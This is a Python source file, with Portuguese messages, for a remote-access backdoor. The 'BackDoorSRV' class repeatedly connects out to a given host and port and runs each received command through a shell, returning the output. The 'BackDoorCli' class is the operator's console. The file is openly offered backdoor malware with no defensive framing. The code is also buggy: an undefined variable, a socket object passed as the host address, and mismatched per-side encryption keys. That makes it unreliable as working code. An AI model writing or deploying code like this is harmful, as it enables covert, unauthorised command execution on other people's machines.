from os import strerror
from datetime import datetime
from subprocess import Popen, PIPE
from cryptography.fernet import Fernet
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

class BackDoorSRV:
    def __init__(self, host, port=5000):
        self.print(f"INICIANDO CONEXAO COM {host}:{port}")
        self.conexao = socket(AF_INET, SOCK_STREAM)
        self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.conexao.settimeout(20)
        self.buffer = 1024
        self.encriptarMsg()
        self.host = host
        self.port = port
        self.run()

    def run(self):
        contagem = 0
        while True:
            try:
                print(f"TENTANDO CONECTAR({contagem})", end='\r')
                contagem += 1
                self.conexao.connect((self.host, self.port))
                self.receberConexao()
            except: self.conexao.close()

    def receberConexao(self):
        self.send(self.conexao, f"VOCÊ ESTA CONECTADO!\n")
        self.send(self.conexao, f"DIGITE SEU COMANDO E PRESSIONE [ENTER]\n")
        self.send(self.conexao, f"CMD({datetime.now()}) > ")
        while True:
            try: 
                try:
                    cmd = self.recv(self.conexao)
                    if('\n' != cmd): 
                        if('sair' in cmd): 
                            self.send(self.conexao, f"{datetime.now()} TCHAL...")
                            self.print(f"CLIENTE SAIU {self.host}... ")
                            self.conexao.close(); break 
                        self.cmds(cmd, self.conexao)
                        self.print(cmd)
                    con.send(f"CMD({datetime.now()}) > ".encode('UTF-8'))
                except Exception as erro: self.fecharConexao(self.conexao, erro); break
            except Exception as erro: self.fecharConexao(self.conexao, erro); break

    def fecharConexao(self, con, err):
        print(f"ERRO ENCONTRADO NA CONEXAO {con} ---> {err}")
        try: con.close()
        except: pass

    def cmds(self, cmd, cliente):
        cliente.send(Popen(cmd.replace('\n', ''), shell=True, stdout=PIPE, stdin=PIPE).stdout.read())

    def print(self, msg, log=True):
        print(msg)
        if(log): self.gravarLog(msg.replace('\n', ''))

    def encriptarMsg(self):
        objKey = Fernet.generate_key()
        self.objEncryptor = Fernet(objKey)

    def send(self, con, msg):
        con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))

    def recv(self, con):        
        return self.objEncryptor.decrypt(con.recv(self.buffer))

    def gravarLog(self, msg):
        with open('log.log', 'a') as arq: arq.write(f'{datetime.now()} ---- ' + msg + '\n')

class BackDoorCli(BackDoorSRV):
    def __init__(self, srv, port):
        self.print(f"INICIANDO CONEXAO {srv}: {port}")
        self.conexao = srv
        self.port = port
        try:
            self.conexao = socket(AF_INET, SOCK_STREAM)
            self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.encriptarMsg()
            self.buffer = 1024
            self.run()
        except Exception as erro: input(f'COMPUTADOR {self.conexao}:{self.port} NÃO ESTA ACESSIVEL: {erro}')

    def run(self): 
        self.conexao.connect((self.conexao, self.port))
        print("[!!!] PRONTO PARA OPERAR COMANDANTE!\n")
        while True:
            try:
                print(self.recv(self.conexao))
                cmd = input("DIGITE O COMANDO DO DOS E PRESSIONE [ENTER]>:")
                self.send(self.conexao, cmd)
            except: pass

BackDoorSRV('127.0.0.1', 5000)
#BackDoorCli('127.0.0.1', 5000)